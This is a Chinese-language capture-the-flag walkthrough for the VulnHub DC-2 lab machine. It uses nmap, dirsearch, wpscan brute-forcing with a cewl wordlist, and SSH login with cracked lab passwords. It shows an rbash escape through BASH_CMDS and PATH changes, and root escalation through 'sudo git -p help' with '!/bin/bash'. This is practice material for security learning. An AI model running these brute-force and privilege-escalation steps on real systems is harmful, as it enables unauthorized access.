## 一， **部署方法**

  1. 在官网上下载zip压缩包
  2. 下载到本地上解压缩后使用虚拟机导入.ova后缀的文件（在过程中出现问题不用理睬，点击重试即可）
  3. 配置网络，本人设置的是nat模式，这个看个人需求
  4. 打开靶机即可

## 二， **靶机地址和描述**

### 1\. **下载地址**

> https://download.vulnhub.com/dc/DC-2.zip

### 2\. **靶机描述**

![1670500112_6391cf10d11a4250096e8.png!small?1670500114176](https://image.3001.net/images/20221208/1670500112_6391cf10d11a4250096e8.png!small?1670500114176)

像DC-1一样，目标也是五个flag

## 三， **测试**

###  **1.信息收集**

首先扫描网段

> arp-scan -l

![1670500132_6391cf24179ec16cada9e.png!small?1670500148795](https://image.3001.net/images/20221208/1670500132_6391cf24179ec16cada9e.png!small?1670500148795)

攻击机的IP是141，135是另一台机器，所以靶机的地址是192.168.237.144

使用nmap对靶机进行全面扫描

> nmap -A -T4 -p- 192.168.237.144

![1670500144_6391cf303b2696a5cedac.png!small?1670500148795](https://image.3001.net/images/20221208/1670500144_6391cf303b2696a5cedac.png!small?1670500148795)

发现靶机开放了80端口，是web服务 和 7744端口，是ssh服务

在网页访问192.168.237.144，发现没法访问

![1670500162_6391cf4277da071c5eeb0.png!small?1670500163554](https://image.3001.net/images/20221208/1670500162_6391cf4277da071c5eeb0.png!small?1670500163554)

修改攻击机kali中的文件：/etc/hosts

> vi /etc/hosts
>
>
> ![1670500174_6391cf4e315072f1b3e1b.png!small?1670500175138](https://image.3001.net/images/20221208/1670500174_6391cf4e315072f1b3e1b.png!small?1670500175138)

###  **2.漏洞利用**

再次访问网站

![1670500182_6391cf5659c1568fed7fb.png!small?1670500183845](https://image.3001.net/images/20221208/1670500182_6391cf5659c1568fed7fb.png!small?1670500183845)

成功进入，发现这个站点是wordpress的CMS

查看页面，发现第一个flag

![1670500186_6391cf5ad36399b469015.png!small?1670500187865](https://image.3001.net/images/20221208/1670500186_6391cf5ad36399b469015.png!small?1670500187865)

Flag1：你经常使用的密码字典可能会没有用，因此，也许你需要cewl。更多的密码总是好的，但有时你无法赢得所有的密码。只有登录才能查看下一个flag，如果你找不到请使用另一个身份登录。

发现页面上没有登录入口

使用dirsearch进行目录爆破

> dirsearch -u http://dc-2/

![1670500197_6391cf6503380224109b4.png!small?1670500197975](https://image.3001.net/images/20221208/1670500197_6391cf6503380224109b4.png!small?1670500197975)

![1670500200_6391cf68a70d4c0c66e57.png!small?1670500201868](https://image.3001.net/images/20221208/1670500200_6391cf68a70d4c0c66e57.png!small?1670500201868)

发现登录入口，进行查看

![1670500205_6391cf6d0b0419b7ad667.png!small?1670500206056](https://image.3001.net/images/20221208/1670500205_6391cf6d0b0419b7ad667.png!small?1670500206056)

发现登录界面。

根据flag1的提示，这里需要用户名和密码进行登录

这里使用针对于wordpress的工具wpscan进行爆破站点的用户名

> wpscan --url [_http://dc-2/_](http://dc-2/)-e u

![1670500210_6391cf728a8d0a1dd8e9f.png!small?1670500211847](https://image.3001.net/images/20221208/1670500210_6391cf728a8d0a1dd8e9f.png!small?1670500211847)

![1670500231_6391cf879b1aa7f71f65f.png!small?1670500232899](https://image.3001.net/images/20221208/1670500231_6391cf879b1aa7f71f65f.png!small?1670500232899)

这里爆破出三个用户名，将这三个用户名保存到文件dcuser.txt中

> vi dcuser.txt
>
> cat dcuser.txt

![1670500246_6391cf964f6752baa98b6.png!small?1670500247249](https://image.3001.net/images/20221208/1670500246_6391cf964f6752baa98b6.png!small?1670500247249)

根据flag1的提示，得使用cewl进行爬取网站关键词而生成密码字典

> cewl http://dc-2/ -w dcpass.txt

![1670500269_6391cfada1c06a78e65a1.png!small?1670500270729](https://image.3001.net/images/20221208/1670500269_6391cfada1c06a78e65a1.png!small?1670500270729)

> cat dcpass.txt | more

![1670500279_6391cfb77f60d3827e737.png!small?1670500280462](https://image.3001.net/images/20221208/1670500279_6391cfb77f60d3827e737.png!small?1670500280462)

再次使用wpscan进行爆破

> wpscan --url http://dc-2/ -U dcuser.txt -P dcpass.txt

![1670500299_6391cfcb8d5530c8952ef.png!small?1670500300734](https://image.3001.net/images/20221208/1670500299_6391cfcb8d5530c8952ef.png!small?1670500300734)

![1670500303_6391cfcf4f124b0d9b251.png!small?1670500304667](https://image.3001.net/images/20221208/1670500303_6391cfcf4f124b0d9b251.png!small?1670500304667)

爆破出来两个用户名和密码

> jerry/adipiscing
>
> tom/parturient

首先使用jerry进行登录

![1670500316_6391cfdc9886dcd5be56d.png!small?1670500317797](https://image.3001.net/images/20221208/1670500316_6391cfdc9886dcd5be56d.png!small?1670500317797)

登录成功，在功能点里面寻找flag的踪迹

![1670500322_6391cfe2a5020241c387c.png!small?1670500323940](https://image.3001.net/images/20221208/1670500322_6391cfe2a5020241c387c.png!small?1670500323940)

在pages下的All pages模块发现flag2，点击查看

![1670500326_6391cfe632de47c1a1d49.png!small?1670500327244](https://image.3001.net/images/20221208/1670500326_6391cfe632de47c1a1d49.png!small?1670500327244)

Flag2：如果你不能利用wordpress并且不能走捷径，这里还有另外的方法。希望你可以找到另外的登陆方式

这里使用另外的用户名tom进行登录

![1670500332_6391cfec99d73dad3e342.png!small?1670500333721](https://image.3001.net/images/20221208/1670500332_6391cfec99d73dad3e342.png!small?1670500333721)

寻找过后，没有任何发现。

这条路走不通了，尝试从7744端口，ssh服务下手

这里使用jerry和tom进行ssh登录

> ssh jerry@192.168.237.144 -p 7744

![1670500351_6391cfff25acd21db8bde.png!small?1670500352452](https://image.3001.net/images/20221208/1670500351_6391cfff25acd21db8bde.png!small?1670500352452)

登录不成功,尝试使用tom再进行登录

> ssh tom@192.168.237.144 -p 7744

![1670500367_6391d00fd5e8dc204e578.png!small?1670500369108](https://image.3001.net/images/20221208/1670500367_6391d00fd5e8dc204e578.png!small?1670500369108)

成功进行登录

使用ls进行查看，发现目录下有flag3.txt的文件

使用cat进行查看，发现cat命令不可用，发现当前是rbash，被限制的shell，所以考虑rbash绕过

这里通过环境变量来查看可以使用的命令

> echo $PATHtom@DC2:~$ echo /home/tom/usr/bin/*

![1670500382_6391d01e37ec30c7efa43.png!small?1670500383184](https://image.3001.net/images/20221208/1670500382_6391d01e37ec30c7efa43.png!small?1670500383184)

发现可以使用的命令有：less ls scp vi

这里使用vi进行查看

> vi flag3.txt

![1670500394_6391d02acf86b1e81a048.png!small?1670500395795](https://image.3001.net/images/20221208/1670500394_6391d02acf86b1e81a048.png!small?1670500395795)

Flag3:可怜的tom总是走在jerry的后面，也许他应该su缓解他的压力

猜测是su jerry到Jerry的用户上，但是su命令不可用，猜测是需要绕过rbash

这里搜索一下如何绕过（也是第一次遇到）

执行如下命令：

> BASH_CMDS[a]=/bin/sh;a 将/bin/bash给a变量
>
> export PATH=$PATH:/bin/ 将/bin作为PATH环境变量导出
>
> export PATH=$PATH:/usr/bin 将/usr/bin作为PATH环境变量导出

接着执行cat命令，发现成功执行，这说明成功绕过

![1670500410_6391d03a2a946da174571.png!small?1670500411161](https://image.3001.net/images/20221208/1670500410_6391d03a2a946da174571.png!small?1670500411161)

接着执行

> su jerry

使用之前爆出的密码登录到jerry的用户下

![1670500420_6391d0442ba000be3b56c.png!small?1670500421147](https://image.3001.net/images/20221208/1670500420_6391d0442ba000be3b56c.png!small?1670500421147)

成功登录

进入jerry的家目录，输入ls进行查看

![1670500424_6391d0481ee2c58801018.png!small?1670500425073](https://image.3001.net/images/20221208/1670500424_6391d0481ee2c58801018.png!small?1670500425073)

发现第四个flag，使用cat进行查看

![1670500427_6391d04b604831820a977.png!small?1670500428676](https://image.3001.net/images/20221208/1670500427_6391d04b604831820a977.png!small?1670500428676)

Flag4：很高兴看到你来到这里-但是你还没有回家，你仍然需要找到最后的flag（唯一真正的flag），这里没有任何提示-你只能靠你自己，继续-离开这里

根据flag4中的内容，可以推断出下一步是提权操作。Flag4中出现git标志，这里猜测是使用git提权

使用

> sudo -l

查看当前用户可以用root身份执行的命令

![1670500438_6391d05669dc8da68ef04.png!small?1670500439433](https://image.3001.net/images/20221208/1670500438_6391d05669dc8da68ef04.png!small?1670500439433)

可以发现可以使用root身份执行git命令，所以下一步使用git提权

输入

> sudo git -p help

接着输入!/bin/bash即可提权成功

![1670500449_6391d061309bd9ce4cd39.png!small?1670500450614](https://image.3001.net/images/20221208/1670500449_6391d061309bd9ce4cd39.png!small?1670500450614)

![1670500452_6391d064cbfb235491371.png!small?1670500453788](https://image.3001.net/images/20221208/1670500452_6391d064cbfb235491371.png!small?1670500453788)

使用cd /root 切换到root的家目录下，输入ls进行查看

![1670500457_6391d0690669ba9440be9.png!small?1670500457954](https://image.3001.net/images/20221208/1670500457_6391d0690669ba9440be9.png!small?1670500457954)

找到最后的flag，这里使用cat命令进行查看

![1670500460_6391d06cce1825e8e8c59.png!small?1670500461886](https://image.3001.net/images/20221208/1670500460_6391d06cce1825e8e8c59.png!small?1670500461886)

成功获取所有的flag，成功通关

## 四， **知识点总结**

> nmap工具的使用
>
> dirsearch工具爆破目录
>
> Wpscan工具对wordpres站点的爆破
>
> Cewl工具对站点关键字的抓取制作字典
>
> Ssh服务的利用
>
> rbash的绕过
>
> Sudo提权
>
> Git提权

